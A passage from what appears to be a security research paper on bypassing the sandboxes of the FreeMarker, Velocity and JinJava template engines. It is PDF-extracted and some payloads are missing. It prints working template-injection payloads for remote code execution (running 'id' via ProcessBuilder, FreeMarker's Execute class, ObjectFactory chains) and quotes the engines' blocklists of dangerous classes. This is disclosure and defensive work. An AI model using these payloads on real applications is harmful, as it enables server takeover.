C​amelContext 
CamelContext exposes numerous ways to execute arbitrary code. The most straightforward
involves the ​getClassResolver()​ and ​getInjector()​ methods: 
${sem.getEngineByName("js").eval("var proc=new 
java.lang.ProcessBuilder('id');var is=proc.start().getInputStream(); var 
sc=new java.util.Scanner(is); var out=''; while (sc.hasNext()) {out += 
(sc.nextLine())};out")}"​; 
Specific Sandbox Bypasses 
FreeMarker 
The Sandbox is enabled by default and consist of a ​method-based blocklist​: 
java.lang.Object.wait() 
java.lang.Object.wait(long) 
java.lang.Object.wait(long,int) 
java.lang.Object.notify() 
java.lang.Object.notifyAll() 
java.lang.Class.getClassLoader() 
java.lang.Class.newInstance() 
java.lang.Class.forName(java.lang.String) 
java.lang.Class.forName(java.lang.String,boolean,java.lang.ClassLoader) 
java.lang.reflect.Constructor.newInstance([Ljava.lang.Object;) 
java.lang.reflect.Method.invoke(java.lang.Object,[Ljava.lang.Object;) 
java.lang.reflect.Field.set(java.lang.Object,java.lang.Object) 
java.lang.reflect.Field.setBoolean(java.lang.Object,boolean) 
java.lang.reflect.Field.setByte(java.lang.Object,byte) 
java.lang.reflect.Field.setChar(java.lang.Object,char) 
java.lang.reflect.Field.setDouble(java.lang.Object,double) 
java.lang.reflect.Field.setFloat(java.lang.Object,float) 
java.lang.reflect.Field.setInt(java.lang.Object,int) 
java.lang.reflect.Field.setLong(java.lang.Object,long) 
java.lang.reflect.Field.setShort(java.lang.Object,short) 
java.lang.reflect.AccessibleObject.setAccessible([Ljava.lang.reflect.Accessibl
eObject;,boolean) 
java.lang.reflect.AccessibleObject.setAccessible(boolean) 
… 
[Code Ref #6] 
The most notorious miss is that ​java.lang.ClassLoader methods are not included.
Therefore,
the
only
protection
against
ClassLoader-based
attacks
is
to
block
the
java.lang.Class.getClassLoader() method, which as we saw previously is insufficient
because there are other ways to grab an instance of a ClassLoader. 
The second most obvious miss is that ​java.lang.reflect.Field setters are blocked, but not
the getters. Since ​java.lang.Class.getFields() is not blocked, there is nothing to prevent
us from accessing public fields. Instance fields are interesting but they require us to first get an
instance of a given class. However, we can access static fields without issue. 
RCE via ClassLoader access 
As we saw when we reviewed the blocklist, few java.lang.Class methods are blocked, and
specifically getProtectionDomain is not. We can abuse this gap to get an instance of a
ClassLoader and initiate a ClassLoader-based attack. As we saw in previous sections, the
attack guarantees arbitrary file read and can escalate to RCE when the returned ClassLoader is
an instance of a Web Application ClassLoader. 
${object.getClass().getProtectionDomain().getClassLoader()} 
Access to ClassLoader methods and ProtectionDomain was blocked as part of the 2.30 release. 
RCE via URLClassLoader 
An interesting case of ClassLoader attack is where the accessed ClassLoader is an instance, or
extends, java.net.URLClassLoader​. As we saw in the ClassLoader section, that enabled us
to load attacker-controlled classes. However, not being able to instantiate them, the only
remaining vector to get RCE is through the Class static initializer. To execute this code, we
need to initialize the class by, for example, instantiating the class or calling a static method.
Since these two vectors are blocked by the sandbox, we need to find a different approach. The
solution is to access a static field that is allowed by the blocklist. 
To accomplish this, we need to prepare and host a malicious JAR file that contains a Class with
our payload in the static initialization block and an arbitrary static field: 
The final payload would look like: 
This vector is now fixed since access to ClassLoader methods is blocked as part of the 2.30
release. 
Universal RCE 
The previous vector is useful but still depends on finding an instance of a URLClassLoader. To
remove this constraint, we need to find a public static field on a class available in the JDK or
FreeMarker library (so it is always available) that contains a method that can give us arbitrary
code execution. To find these fields, we use ​CodeQL​, a language that allows us to query the
source code as if we were querying a database with SQL. 
We look for all public static fields whose type contains a method that contains a call to
Constructor.newInstace()​ or ​Class.newInstance()​ methods: 
https://lgtm.com/query/7057188514997185938/ 
This was just an exploratory query without using dataflow. Since the query returns valid and
useful results, we didn't improve it and will leave as an exercise to the reader to improve this
query to use dataflow to make sure we control the arguments to the ​newInstance() method
and avoid the need for the call to be directly enclosed. 
In addition, we looked for methods that lead to arbitrary object instantiation. Other RCE-leading
vectors could be included in the query as well. 
As mentioned above, the query provided interesting and valid results: 
The query returned four different public and static fields of different types extending the
BeansWrapper class, which contains a ​newInstance() method that basically wraps the
Constructor.newInstance() method. Jackpot! With that we can build our universal (at the
time of finding) payload: 
${dwf.​newInstance​(ec,null)("")} 
We can instantiate arbitrary types, but we chose ​freemarker.template.utility.Execute
to keep the payload self-contained in FreeMarker classes. 
This was fixed in 2.30 with the introduction of a new sandbox based on ​MemberAccessPolicy​.  
Default policy that improves the blocklist and forbids access to ClassLoader methods and public
fields through reflection. The ​Legacy policy is still vulnerable​. 
RCE via Servlet objects 
When using FreeMarker as the view layer of a Servlet application, Servlets objects (request,
response, session and servletContext) are exposed as FreeMarker models. 
According to the ​official documentation​: 
In both templates, when you refer to user and latestProduct, it will first try to find a variable with
that name that was created in the template (like prod; if you master JSP: a page scope
attribute). If that fails, it will try to look up an attribute with that name in the HttpServletRequest,
and if it is not there then in the HttpSession, and if it still doesn't find it then in the
ServletContext. 
Therefore Session, Request and ServletContext attributes are exposed directly to the Context.
Also: 
FreemarkerServlet also puts 3 hashes into the data-model, by which you can access the
attributes of the 3 objects directly. The hash variables are: Request, Session, Application
(corresponds to ServletContext). It also exposes another hash named RequestParameters that
provides access to the parameters of the HTTP request. 
By having access to the ServletContext attributes, attackers can access additional interesting
objects such as an InstanceManager (Tomcat, Jetty, WildFly) or access the Spring Application
Context.  
Please note that these vectors are still valid even on the latest FreeMarker version (2.30 at the
time of this writing). If you are using templates that users can edit, you might want to implement
a​ ​WhitelistMemberPolicy​. 
Velocity 
Velocity implements its sandbox through the ​SecureUberspector class. Unlike FreeMarker,
Velocity uses a class and package-based blocklist. We find this approach to be more effective
since it is easier to forget to include individual methods in the method-based blocklist. For
example, the whole ​java.lang.reflect
​package is blocked (preventing access to the
Reflection API) and all methods from ​java.lang.Class and ​java.lang.ClassLoader are
blocked: 
# ---------------------------------------------------------------------------- 
# SECURE INTROSPECTOR 
# ---------------------------------------------------------------------------- 
# If selected, prohibits methods in certain classes and packages from being 
# accessed. 
# ---------------------------------------------------------------------------- 
introspector.restrict.packages = java.lang.reflect 
# The two most dangerous classes 
introspector.restrict.classes​ = ​java.lang.Class 
introspector.restrict.classes​ = ​java.lang.ClassLoader 
# Restrict these for extra safety 
introspector.restrict.classes = java.lang.Compiler 
introspector.restrict.classes = java.lang.InheritableThreadLocal 
introspector.restrict.classes = java.lang.Package 
introspector.restrict.classes = java.lang.Process 
introspector.restrict.classes = java.lang.Runtime 
introspector.restrict.classes = java.lang.RuntimePermission 
introspector.restrict.classes = java.lang.SecurityManager 
introspector.restrict.classes = java.lang.System 
introspector.restrict.classes = java.lang.Thread 
introspector.restrict.classes = java.lang.ThreadGroup 
introspector.restrict.classes = java.lang.ThreadLocal 
[Code Ref #7] 
A flaw and an unexpected feature 
Even though the blocklist is pretty comprehensive and forbids access to all the Reflection APIs
and all ​java.lang.Class and ​java.lang.ClassLoader methods, we found a flaw in its
implementation. When the class (and package) is checked against the blocklist, only the class
of the current object is considered, not its complete class hierarchy: 
/** 
 *  Method 
 * @param obj 
 * @param methodName 
 * @param args 
 * @param i 
 * @return A Velocity Method. 
 */ 
public VelMethod getMethod(Object obj, String methodName, Object[] args, Info 
i) 
    throws Exception 
{ 
    if (obj == null) 
    { 
        return null; 
    } 
    ​Method m = introspector.getMethod(​obj.getClass()​, methodName, args); 
    if (m != null) 
    { 
        return new VelMethodImpl(m); 
    } 
[Code Ref #8] 
For a more concise example, let's use the following template on an application running on
Tomcat: 
${request.servletContext.classLoader.loadClass("CLASS")} 
When
​UberspectImpl.getMethod()
is
called
to
resolve
​loadClass(“CLASS”)​,
SecureIntrospector.getMethod()
is
called
with
the
current
object’s
class:
org.apache.catalina.loader.ParallelWebappClassLoader​. This is the class that is
checked against the blocklist, and therefore, since this specific class is not present, the method
invocation is allowed, returning an arbitrary ​java.lang.Class​ object. 
This flaw was reported to Velocity and fixed in version 2.3. 
To exploit this flaw, we can take advantage of the ClassLoader-based attacks that were
presented in previous sections. If the ClassLoader that we access is not an instance of a Web
Application ClassLoader, there is still another road we can take. 
In Java, to invoke a static method given its Class object we need to do something like: 
cl.loadClass("java.lang.Runtime").getMethod("getRuntime").invoke(null) 
However, Velocity enables a shortcut to provide direct access to static methods from their Class
object: 
/**  
 *  Method 
 * @param obj 
 * @param methodName 
 * @param args 
 * @param i 
 * @return A Velocity Method. 
 */ 
public VelMethod getMethod(Object obj, String methodName, Object[] args, Info 
i) { 
    ... 
    // ​watch for classes, to allow calling their static methods ​(​VELOCITY-102​) 
    ​else if (cls == Class.class)​  { 
        ​m = introspector.getMethod((Class)obj, methodName, args); 
        if (m != null) { 
            return new VelMethodImpl(m, false, 
getNeededConverters(m.getGenericParameterTypes(), args)); 
        } 
    } 
    ... 
} 
[Code Ref #9] 
With this feature, we can load the 
 ​com.sun.org.apache.xerces.internal.utils.ObjectFactory class and invoke its
newInstance()​ static method to instantiate arbitrary objects​: 
$request.servletContext.classLoader.loadClass("com.sun.org.apache.xerces.inter
nal.utils.ObjectFactory").​newInstance​("javax.script.ScriptEngineManager",null,
true) 
Velocity Tools 
Velocity offers two "plugin" modules: 
●
GenericTools​: a set of classes that provide basic infrastructure for using tools in
standard Java SE Velocity projects, as well as a set of tools for use in generic Velocity
templates. 
●
VelocityView​: includes all of the ​GenericTools structure and specialized tools for using
Velocity in the view layer of web applications (Java EE projects). This includes the
VelocityViewServlet
or
​VelocityLayoutServlet
for processing Velocity template
requests, the ​VelocityViewTag for embedding Velocity in JSP and a ​Maven plugin
to
embed JSP tag libraries in Velocity templates. 
GenericTools are not enabled by default and must be installed on a tool-by-tool basis. Of all the
available tools, three of them stand out: 
●
ContextTool​: Provides convenient access to Context data and metadata that allows us
to list all the objects in the Template Context:  
#foreach( $key in $context.keys ) 
    $key = $context.get($key) 
#end 
We found ContextTool deployed on two of the analyzed CMS applications. In both
applications the accessible object was an instance of ​ChainedContext which exposes
additional interesting features: 
●
getRequest()​: ​Returns the current servlet request. 
●
getServletContext()​: ​Returns the servlet context. 
●
getSession()​: Returns the current session, if any. 
●
getVelocityContext()​: ​Returns a reference to the Velocity context 
●
getVelocityEngine()​: ​Returns a reference to the VelocityEngine. 
●
ClassTool​: Gives access to the Java Reflection API and allows us to load arbitrary
classes:  
$class.inspect("com.sun.org.apache.xerces.internal.utils.ObjectFactory"
).type 
By using this Velocity shortcut to invoke static methods, we can easily instantiate
arbitrary types and get RCE: 
$class.inspect("com.sun.org.apache.xerces.internal.utils.ObjectFactory")
.type.newInstance("javax.script.ScriptEngineManager",null,true) 
This tool is rarely installed and was not found on any of the analyzed CMS applications. 
●
FieldTool​: Provides (easy) access to static fields in a class, such as string constants.
We can abuse this similarly to the way we did with FreeMarker. We found this tool
installed on one CMS and we were able to get RCE using:  
#set( $wrapper = 
$_FieldTool.in("freemarker.template.ObjectWrapper").DEFAULT_WRAPPER) 
#set( $resolver = 
$_FieldTool.in("freemarker.core.TemplateClassResolver").UNRESTRICTED_RE
SOLVER) 
#set( $execute_class = 
$resolver.resolve("freemarker.template.utility.Execute",null,null)) 
${$execute_class.exec(["id"])} 
Interestingly enough, we are using FreeMarker classes for this Velocity payload. This
was possible since the application was using Spring Framework which imported
FreeMarker as a dependency. 
VelocityView is normally used when Velocity is used as the View layer of an MVC application.
When VelocityView is used the ​HttpServletRequest​, ​HttpSession​, ​ServletContext​, and
their attributes are automatically available in the templates. 
JinJava 
JinJava uses a very short method-based blocklist: 
RESTRICTED_METHODS = builder() 
   .add("clone") 
   .add("hashCode") 
   .add("getClass") 
   .add("getDeclaringClass") 
   .add("forName") 
   .add("notify") 
   .add("notifyAll") 
   .add("wait").build(); 
[Code Ref #10] 
However, it does a great job of preventing access to ​java.lang.Class instances. It prevents
any access to a ​java.lang.Class property or invocation of any methods returning a
java.lang.Class​ instance. 
@Override 
public Object getValue(ELContext context, Object base, Object property) { 
    Object result = super.getValue(context, base, 
validatePropertyName(property)); 
    return ​result instanceof Class​ ? null : result; 
} 
[Code Ref #11] 
@Override 
public Object invoke( 
    ELContext context, 
    Object base, 
    Object method, 
    Class[] paramTypes, 
    Object[] params 
  ) { 
    if (method == null || RESTRICTED_METHODS.contains(method.toString())) { 
      throw new MethodNotFoundException( 
        "Cannot find method '" + method + "' in " + base.getClass() 
      ); 
    } 
    Object result = super.invoke(context, base, method, paramTypes, params); 
    ​if (result instanceof Class)​ { 
      throw new MethodNotFoundException( 